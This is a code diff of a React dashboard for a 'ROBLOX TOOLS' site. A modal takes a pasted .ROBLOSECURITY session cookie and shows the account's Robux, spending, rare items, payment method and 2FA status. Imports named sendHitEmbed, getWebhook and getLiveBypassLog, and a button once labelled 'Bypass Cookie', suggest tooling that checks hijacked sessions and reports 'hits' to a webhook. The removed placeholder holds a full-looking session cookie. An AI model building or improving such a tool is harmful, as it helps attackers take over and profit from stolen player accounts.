@@ -1,6 +1,6 @@
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Shield, Zap, Cookie, Loader2, X, Activity, Menu, CheckCircle2, XCircle } from "lucide-react";
+import { Shield, Zap, Cookie, Loader2, X, Activity, Menu, CheckCircle2, XCircle, Coins, Sparkles, KeyRound, Mail, ShieldCheck, CreditCard, Crown } from "lucide-react";
 import {
   AccountInfo, sendHitEmbed, getWebhook, WK,
   getLiveBypassLog, LiveBypassEntry,
@@ -8,6 +8,7 @@ import {
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import DiscordInviteCard from "@/components/DiscordInviteCard";
+import ThemeToggle from "@/components/ThemeToggle";
 
 const Dashboard = () => {
   const navigate = useNavigate();
@@ -103,6 +104,9 @@ const Dashboard = () => {
           <h1 className="text-xl font-bold text-foreground glow-text tracking-wide">ROBLOX TOOLS</h1>
           <div className="w-10" />
         </div>
+        <div className="flex justify-center">
+          <ThemeToggle />
+        </div>
 
         <div className="card-glow rounded-2xl p-5 space-y-3">
           <h2 className="text-base font-bold text-foreground flex items-center gap-2">
@@ -138,50 +142,97 @@ const Dashboard = () => {
           className={`fixed inset-0 z-40 flex items-center justify-center px-4 bg-background/70 backdrop-blur-sm transition-opacity duration-300 ${fetchClosing ? 'opacity-0' : 'opacity-100 animate-fade-in'}`}
           onClick={(e) => { if (e.target === e.currentTarget) closeFetch(); }}
         >
-          <div className={`card-glow rounded-2xl max-w-md w-full p-6 space-y-4 relative transition-all duration-300 ${fetchClosing ? 'opacity-0 scale-95' : 'opacity-100 scale-100 animate-scale-in'}`}>
-            <button onClick={closeFetch} className="absolute top-3 right-3 text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
-            <h2 className="text-base font-bold text-foreground flex items-center gap-2"><Cookie size={16} className="text-primary" /> Cookie</h2>
-            <textarea
-              value={fetchCookieInput}
-              onChange={e => setFetchCookieInput(e.target.value)}
-              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzc2NTY4MTI4MjU0MzU5NjgyNjAoAw.-F0W-P67QmzeGoL2fFY59Kl-c7m2AucDHOtV4kVOjMMPVALszOeG5bSHzPwNkP25m_A"
-              className="input-field text-xs font-mono min-h-[100px] resize-y w-full transition-all"
-            />
+          <div className={`card-glow rounded-2xl max-w-md w-full p-6 space-y-5 relative transition-all duration-300 ${fetchClosing ? 'opacity-0 scale-95' : 'opacity-100 scale-100 animate-scale-in'}`}>
+            <button onClick={closeFetch} className="absolute top-3 right-3 text-muted-foreground hover:text-foreground p-1.5 rounded-lg hover:bg-secondary transition-all"><X size={16} /></button>
+
+            <div className="flex items-center gap-3">
+              <div className="w-11 h-11 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
+                <Cookie size={18} className="text-primary" />
+              </div>
+              <div>
+                <h2 className="text-base font-bold text-foreground">Fetch Cookie</h2>
+                <p className="text-[11px] text-muted-foreground">Inspect a ROBLOSECURITY cookie</p>
+              </div>
+            </div>
+
+            <div className="space-y-2">
+              <label className="text-xs font-semibold text-foreground flex items-center gap-1.5">
+                <KeyRound size={12} className="text-primary" /> Cookie
+              </label>
+              <textarea
+                value={fetchCookieInput}
+                onChange={e => setFetchCookieInput(e.target.value)}
+                placeholder="_|WARNING:-DO-NOT-SHARE-THIS.|_..."
+                className="input-field text-xs font-mono min-h-[110px] resize-y w-full transition-all"
+              />
+            </div>
+
             <button
               onClick={handleFetch}
               disabled={loading}
-              className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn disabled:opacity-50 transition-all duration-300 active:scale-95 hover:scale-[1.02] hover:shadow-[0_0_28px_hsl(var(--primary)/0.55)]"
+              className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn disabled:opacity-50 transition-all duration-300 active:scale-95 hover:scale-[1.02]"
             >
-              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Bypass Cookie</>}
+              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <><Sparkles size={14} /> Fetch Cookie</>}
             </button>
+
             {result && (
-              <div className="bg-secondary/40 border border-border/50 rounded-xl p-3 space-y-1.5 text-xs max-h-72 overflow-y-auto animate-fade-in">
-                <div className="flex items-center gap-3 pb-2 border-b border-border/40">
-                  {result.avatarUrl && <img src={result.avatarUrl} alt={result.username} className="w-10 h-10 rounded-lg border border-border/50" />}
-                  <div>
-                    <p className="text-sm font-bold text-foreground">{result.username}</p>
-                    <p className="text-[10px] text-muted-foreground">ID: {String(result.userId)}</p>
+              <div className="space-y-3 animate-fade-in">
+                {/* Profile header */}
+                <div className="relative overflow-hidden rounded-xl p-4 bg-gradient-to-br from-primary/15 via-secondary/40 to-secondary/20 border border-primary/30">
+                  <div className="absolute -top-10 -right-10 w-32 h-32 bg-primary/20 rounded-full blur-3xl" />
+                  <div className="relative flex items-center gap-3">
+                    {result.avatarUrl ? (
+                      <img src={result.avatarUrl} alt={result.username} className="w-14 h-14 rounded-xl border border-primary/40 glow-border" />
+                    ) : (
+                      <div className="w-14 h-14 rounded-xl bg-primary/20 flex items-center justify-center text-lg font-bold text-primary">{(result.username || '?').slice(0, 2).toUpperCase()}</div>
+                    )}
+                    <div className="flex-1 min-w-0">
+                      <p className="text-sm font-bold text-foreground truncate">{result.username}</p>
+                      <p className="text-[10px] text-muted-foreground font-mono">ID: {String(result.userId)}</p>
+                    </div>
+                    <span className="text-[10px] font-bold bg-[hsl(var(--success))]/20 text-[hsl(var(--success))] px-2 py-1 rounded-full inline-flex items-center gap-1">
+                      <span className="w-1.5 h-1.5 rounded-full bg-[hsl(var(--success))] animate-pulse" /> Active
+                    </span>
                   </div>
-                  <span className="ml-auto text-[10px] font-bold bg-[hsl(var(--success))]/20 text-[hsl(var(--success))] px-2 py-0.5 rounded-full">Active</span>
                 </div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Robux</span><span className="text-foreground font-mono">{String(result.robux ?? 0)} | {String(result.pendingRobux ?? 0)}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Spent</span><span className="text-foreground font-mono">{String(result.robuxSpent ?? 0)}</span></div>
-                {([
-                  ['Premium', result.premium],
-                  ['Korblox', result.korblox],
-                  ['Headless', result.headless],
-                  ['Valkyrie', result.valkyrie],
-                  ['Payment', result.hasPayment],
-                  ['2FA', result.has2FA],
-                  ['Email Verified', result.emailVerified],
-                ] as [string, boolean | undefined][]).map(([label, v]) => (
-                  <div key={label} className="flex justify-between items-center">
-                    <span className="text-muted-foreground">{label}</span>
-                    {v
-                      ? <CheckCircle2 size={14} className="text-[hsl(var(--success))]" />
-                      : <XCircle size={14} className="text-destructive" />}
+
+                {/* Stats grid */}
+                <div className="grid grid-cols-2 gap-2">
+                  <div className="bg-secondary/40 border border-border/50 rounded-xl p-3">
+                    <div className="flex items-center gap-1.5 text-[10px] text-muted-foreground mb-1">
+                      <Coins size={11} className="text-[hsl(var(--warning))]" /> Robux
+                    </div>
+                    <p className="text-sm font-bold text-foreground font-mono">{String(result.robux ?? 0)}</p>
+                    <p className="text-[9px] text-muted-foreground">+{String(result.pendingRobux ?? 0)} pending</p>
                   </div>
-                ))}
+                  <div className="bg-secondary/40 border border-border/50 rounded-xl p-3">
+                    <div className="flex items-center gap-1.5 text-[10px] text-muted-foreground mb-1">
+                      <CreditCard size={11} className="text-primary" /> Spent
+                    </div>
+                    <p className="text-sm font-bold text-foreground font-mono">{String(result.robuxSpent ?? 0)}</p>
+                    <p className="text-[9px] text-muted-foreground">lifetime</p>
+                  </div>
+                </div>
+
+                {/* Badges */}
+                <div className="grid grid-cols-2 gap-1.5 text-[11px]">
+                  {([
+                    ['Premium', result.premium, Crown],
+                    ['Korblox', result.korblox, Sparkles],
+                    ['Headless', result.headless, Sparkles],
+                    ['Valkyrie', result.valkyrie, Sparkles],
+                    ['Payment', result.hasPayment, CreditCard],
+                    ['2FA', result.has2FA, ShieldCheck],
+                    ['Email', result.emailVerified, Mail],
+                  ] as [string, boolean | undefined, any][]).map(([label, v, Icon]) => (
+                    <div key={label} className={`flex items-center justify-between px-2.5 py-1.5 rounded-lg border ${v ? 'bg-[hsl(var(--success))]/10 border-[hsl(var(--success))]/30' : 'bg-secondary/40 border-border/40'}`}>
+                      <span className="text-muted-foreground inline-flex items-center gap-1.5"><Icon size={11} /> {label}</span>
+                      {v
+                        ? <CheckCircle2 size={13} className="text-[hsl(var(--success))]" />
+                        : <XCircle size={13} className="text-destructive/70" />}
+                    </div>
+                  ))}
+                </div>
               </div>
             )}
           </div>
